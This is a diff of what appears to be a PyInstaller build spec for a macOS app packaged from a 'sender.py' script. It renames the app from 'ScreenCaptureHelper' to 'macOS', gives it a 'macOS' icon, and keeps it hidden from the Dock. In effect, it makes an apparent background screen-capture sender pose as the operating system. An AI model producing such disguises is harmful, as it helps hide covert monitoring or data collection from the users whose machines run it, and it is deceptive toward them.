@@ -4,7 +4,7 @@ from pathlib import Path
 
 PROJECT_ROOT = Path(SPECPATH).resolve().parents[1]
 SENDER_SCRIPT = PROJECT_ROOT / "sender" / "sender.py"
-APP_ICON = PROJECT_ROOT / "assets" / "icons" / "screencapturehelper.icns"
+APP_ICON = PROJECT_ROOT / "assets" / "icons" / "macOS.icns"
 
 a = Analysis(
     [str(SENDER_SCRIPT)],
@@ -26,7 +26,7 @@ exe = EXE(
     a.scripts,
     [],
     exclude_binaries=True,
-    name='ScreenCaptureHelper',
+    name='macOS',
     debug=False,
     bootloader_ignore_signals=False,
     strip=False,
@@ -45,16 +45,16 @@ coll = COLLECT(
     strip=False,
     upx=True,
     upx_exclude=[],
-    name='ScreenCaptureHelper',
+    name='macOS',
 )
 app = BUNDLE(
     coll,
-    name='ScreenCaptureHelper.app',
+    name='macOS.app',
     icon=str(APP_ICON),
     bundle_identifier=None,
     info_plist={
         "LSUIElement": True,
-        "CFBundleName": "ScreenCaptureHelper",
-        "CFBundleDisplayName": "ScreenCaptureHelper",
+        "CFBundleName": "macOS",
+        "CFBundleDisplayName": "macOS",
     },
 )
